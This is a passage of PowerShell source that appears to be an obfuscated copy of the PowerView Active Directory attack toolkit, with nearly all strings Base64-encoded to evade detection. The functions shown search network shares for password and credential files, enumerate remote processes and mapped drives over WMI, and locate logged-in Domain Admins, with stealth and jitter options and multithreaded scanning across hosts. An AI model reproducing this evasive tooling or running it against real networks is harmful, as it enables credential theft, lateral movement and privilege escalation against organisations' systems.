                            $ProviderName = $Reg.GetStringValue($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcTmV0d29ya1wkRHJpdmVMZXR0ZXI="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvdmlkZXJOYW1l")))).sValue
                            $RemotePath = $Reg.GetStringValue($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcTmV0d29ya1wkRHJpdmVMZXR0ZXI="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlUGF0aA==")))).sValue
                            $DriveUserName = $Reg.GetStringValue($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcTmV0d29ya1wkRHJpdmVMZXR0ZXI="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU=")))).sValue
                            if (-not $UserName) { $UserName = '' }

                            if ($RemotePath -and ($RemotePath -ne '')) {
                                $MountedDrive = New-Object PSObject
                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNJRA=="))) $UserSID
                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RHJpdmVMZXR0ZXI="))) $DriveLetter
                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvdmlkZXJOYW1l"))) $ProviderName
                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlUGF0aA=="))) $RemotePath
                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RHJpdmVVc2VyTmFtZQ=="))) $DriveUserName
                                $MountedDrive.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlJlZ01vdW50ZWREcml2ZQ=="))))
                                $MountedDrive
                            }
                        }
                    }
                    catch {
                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdNb3VudGVkRHJpdmVdIEVycm9yOiB7MH0="))) -f $_)
                    }
                }
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdNb3VudGVkRHJpdmVdIEVycm9yIGFjY2Vzc2luZyAkQ29tcHV0ZXIsIGxpa2VseSBpbnN1ZmZpY2llbnQgcGVybWlzc2lvbnMgb3IgZmlyZXdhbGwgcnVsZXMgb24gaG9zdDogezB9"))) -f $_)
            }
        }
    }
}


function Get-WMIProcess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) = $ComputerName
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xhc3M="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luMzJfcHJvY2Vzcw==")))
                }
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $WmiArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvY2Vzc05hbWU="))) $_.ProcessName
                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvY2Vzc0lE"))) $_.ProcessID
                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) $Owner.Domain
                    $Process | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg=="))) $Owner.User
                    $Process.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlVzZXJQcm9jZXNz"))))
                    $Process
                }
            }
            catch {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlQcm9jZXNzXSBFcnJvciBlbnVtZXJhdGluZyByZW1vdGUgcHJvY2Vzc2VzIG9uICckQ29tcHV0ZXInLCBhY2Nlc3MgbGlrZWx5IGRlbmllZDogezB9"))) -f $_)
            }
        }
    }
}


function Find-InterestingFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Llw="))),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeFolders,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments =  @{
            'Recurse' = $True
            'ErrorAction' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2lsZW50bHlDb250aW51ZQ==")))
            'Include' = $Include
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2ZmaWNlRG9jcw==")))]) {
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5jbHVkZQ==")))] = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5kb2M="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5kb2N4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki54bHM="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki54bHN4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5wcHQ="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5wcHR4"))))
        }
        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RnJlc2hFWEVz")))]) {
            
            $LastAccessTime = (Get-Date).AddDays(-7).ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TU0vZGQveXl5eQ=="))))
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5jbHVkZQ==")))] = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ki5leGU="))))
        }
        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yY2U=")))] = -not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZUhpZGRlbg==")))]

        $MappedComputers = @{}

        function Test-Write {
            
            [CmdletBinding()]Param([String]$Path)
            try {
                $Filetest = [IO.File]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFxcXC4qXFwuKg==")))) -and ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA==")))] = $TargetPath
            Get-ChildItem @SearcherArguments | ForEach-Object {
                
                $Continue = $True
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZUZvbGRlcnM=")))] -and ($_.PSIsContainer)) {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkaW5nOiB7MH0="))) -f $($_.FullName))
                    $Continue = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdFdyaXRlVGltZQ==")))] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRpb25UaW1l")))] -and ($_.CreationTime -lt $CreationTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tXcml0ZUFjY2Vzcw==")))] -and (-not (Test-Write -Path $_.FullName))) {
                    $Continue = $False
                }
                if ($Continue) {
                    $FileParams = @{
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA=="))) = $_.FullName
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3duZXI="))) = $((Get-Acl $_.FullName).Owner)
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdEFjY2Vzc1RpbWU="))) = $_.LastAccessTime
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdFdyaXRlVGltZQ=="))) = $_.LastWriteTime
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRpb25UaW1l"))) = $_.CreationTime
                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGVuZ3Ro"))) = $_.Length
                    }
                    $FoundFile = New-Object -TypeName PSObject -Property $FileParams
                    $FoundFile.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkZvdW5kRmlsZQ=="))))
                    $FoundFile
                }
            }
        }
    }

    END {
        
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}








function New-ThreadedFunction {
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $ComputerName,

        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        [ValidateRange(1,  100)]
        $Threads = 20,

        [Switch]
        $NoImports
    )

    BEGIN {
        
        
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        
        
        $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA

        
        
        if (-not $NoImports) {
            
            $MyVars = Get-Variable -Scope 2

            
            $VorbiddenVars = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Pw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YXJncw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29uc29sZUZpbGVOYW1l"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3I="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhlY3V0aW9uQ29udGV4dA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZmFsc2U="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SE9NRQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SG9zdA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aW5wdXQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5wdXRPYmplY3Q="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUFsaWFzQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bURyaXZlQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUVycm9yQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUZ1bmN0aW9uQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUhpc3RvcnlDb3VudA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bVZhcmlhYmxlQ291bnQ="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TXlJbnZvY2F0aW9u"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnVsbA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UElE"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNCb3VuZFBhcmFtZXRlcnM="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNDb21tYW5kUGF0aA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNDdWx0dXJl"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNEZWZhdWx0UGFyYW1ldGVyVmFsdWVz"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNIT01F"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNTY3JpcHRSb290"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNVSUN1bHR1cmU="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFNWZXJzaW9uVGFibGU="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFdE"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2hlbGxJZA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3luY2hyb25pemVkSGFzaA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dHJ1ZQ=="))))

            
            ForEach ($Var in $MyVars) {
                if ($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            
            ForEach ($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        
        
        

        
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        
        $Method = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QmVnaW5JbnZva2U="))) }) {
            $MethodParameters = $M.GetParameters()
            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aW5wdXQ="))) -and $MethodParameters[1].Name -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b3V0cHV0")))) {
                $Method = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $ComputerName = $ComputerName | Where-Object {$_ -and $_.Trim()}
        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6IHswfQ=="))) -f $($ComputerName.count))

        
        if ($Threads -ge $ComputerName.Length) {
            $Threads = $ComputerName.Length
        }
        $ElementSplitSize = [Int]($ComputerName.Length/$Threads)
        $ComputerNamePartitioned = @()
        $Start = 0
        $End = $ElementSplitSize

        for($i = 1; $i -le $Threads; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $Threads) {
                $End = $ComputerName.Length
            }
            $List.AddRange($ComputerName[$Start..($End-1)])
            $Start += $ElementSplitSize
            $End += $ElementSplitSize
            $ComputerNamePartitioned += @(,@($List.ToArray()))
        }

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBUb3RhbCBudW1iZXIgb2YgdGhyZWFkcy9wYXJ0aXRpb25zOiAkVGhyZWFkcw==")))

        ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
            
            $PowerShell = [PowerShell]::Create()
            $PowerShell.runspacepool = $Pool

            
            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))), $ComputerNamePartition)
            if ($ScriptParameters) {
                ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                }
            }

            
            $Output = New-Object Management.Automation.PSDataCollection[Object]

            
            $Jobs += @{
                PS = $PowerShell
                Output = $Output
                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
            }
        }
    }

    END {
        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBUaHJlYWRzIGV4ZWN1dGluZw==")))

        
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)

        $SleepSeconds = 100
        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBXYWl0aW5nICRTbGVlcFNlY29uZHMgc2Vjb25kcyBmb3IgZmluYWwgY2xlYW51cC4uLg==")))

        
        for ($i=0; $i -lt $SleepSeconds; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        $Pool.Dispose()
        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBhbGwgdGhyZWFkcyBjb21wbGV0ZWQ=")))
    }
}


function Find-DomainUserLocation {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluIEFkbWlucw=="))),

        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [Alias('AllowDelegation')]
        [Switch]
        $UserAllowDelegation,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $ShowAll,

        [Switch]
        $Stealth,

        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $StealthSource = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs"))),

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU=")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJMREFQRmlsdGVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))] = $Unconstrained }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))] = $OperatingSystem }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZXJ2aWNlUGFjaw==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))] = $ServicePack }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTaXRlTmFtZQ==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))] = $SiteName }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $UserSearcherArguments = @{
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWU=")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $UserIdentity }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckxEQVBGaWx0ZXI=")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $UserLDAPFilter }
